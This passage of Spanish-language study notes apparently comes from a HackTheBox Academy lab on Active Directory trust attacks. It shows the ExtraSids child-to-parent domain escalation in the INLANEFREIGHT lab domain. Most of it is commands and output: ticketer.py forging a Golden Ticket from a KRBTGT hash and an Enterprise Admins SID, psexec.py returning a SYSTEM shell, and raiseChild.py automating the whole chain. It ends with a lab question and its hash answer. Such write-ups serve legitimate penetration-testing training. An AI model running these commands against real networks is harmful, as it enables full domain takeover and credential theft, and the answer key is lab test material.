+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+Con los datos reunidos —**hash KRBTGT**, **SID del dominio hijo**, **usuario hacker**, **FQDN** y **SID de Enterprise Admins**— podemos usar **ticketer.py** de **Impacket** para generar un **Golden Ticket** válido tanto en el **dominio hijo** como en el **padre** mediante las opciones `-domain-sid` y `-extra-sid`.
+
+##### Construyendo un Golden Ticket usando `ticketer.py`
+
+```shell
+$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+```
+
+El ticket será guardado en nuestro sistema como un archivo `ccache`, que se usa para almacenar credenciales Kerberos. Estableciendo la variable de entorno `KRB5CCNAME` le dice al sistema que use dicho archivo para los intentos de autenticación.
+
+```shell
+$ export KRB5CCNAME=hacker.ccache 
+```
+
+Podemos comprobar si la autenticación al **controlador de dominio padre** es exitosa usando la versión de **Psexec** incluida en **Impacket**. Si funciona, obtendremos una **shell con privilegios SYSTEM** en el controlador de dominio objetivo.
+
+```shell
+$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file nkYjGWDZ.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service eTCU on 172.16.5.5.....
+[*] Starting service eTCU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+**Impacket** incluye la herramienta **raiseChild.py**, que automatiza la **escalada de dominio hijo a dominio padre**. Solo hay que indicar el **controlador de dominio objetivo** y las **credenciales de un administrador del dominio hijo**.  
+El script realiza todo el proceso: obtiene el **SID de Enterprise Admins** del dominio padre, extrae el **hash KRBTGT** del hijo, crea un **Golden Ticket**, inicia sesión en el dominio padre, recupera las credenciales del **Administrador** y, si se usa el parámetro `--target-exec`, se autentica al **controlador de dominio padre mediante Psexec**.
+
+##### Lanzando el ataque con `raiseChild.py`
+
+```shell-session
+amr251@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+...SNIP...
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+El script lista la metodología de trabajo. Aunque herramientas como **raiseChild.py** ahorran tiempo, es fundamental **entender el proceso manual** y saber reunir los datos necesarios. Si la herramienta falla, podremos detectar el problema y corregirlo; si la usamos a ciegas, no. En entornos de producción debemos **evitar los scripts “autopwn”**, que ejecutan cadenas de ataque automáticamente (como los basados en BloodHound), ya que pueden causar daños o comportamientos imprevistos. Siempre es preferible usar herramientas que comprendamos por completo y construir los comandos manualmente para mantener **control y seguridad total** durante la auditoría.
+
+##### _Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer._
+
+> **Respuesta:** 49a074a39dd0651f647e765c2cc794c7 (No hemos terminado los apuntes aún)
